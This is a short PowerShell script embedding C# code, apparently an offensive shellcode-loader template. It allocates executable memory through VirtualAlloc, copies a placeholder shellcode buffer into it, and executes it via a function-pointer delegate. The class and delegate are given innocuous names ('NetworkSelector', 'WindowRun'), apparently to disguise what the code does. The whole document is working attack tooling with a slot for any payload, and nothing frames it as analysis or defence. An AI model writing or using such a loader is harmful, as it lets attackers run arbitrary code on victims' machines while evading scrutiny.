$NetworkSelector = @"
using System;
using System.Runtime.InteropServices;

class NetworkSelector {
    static byte[] my_buf = new byte[<PUT_YOUR_SHELLCODE_LENGTH_HERE>] {
        <PUT_YOUR_SHELLCODE_HERE - e.g. "0x39,0xc0,0x73,0x1d,0x8b,...">
    };
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    public static void Main() {
        IntPtr my_virt_alloc_pointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(my_buf.Length), 0x1000, 0x40);
        Marshal.Copy(my_buf, 0x0, my_virt_alloc_pointer, my_buf.Length);
        WindowRun network_selector = Marshal.GetDelegateForFunctionPointer<WindowRun>(my_virt_alloc_pointer);
        network_selector();
    }
}
"@
Add-Type $NetworkSelector
[NetworkSelector]::Main()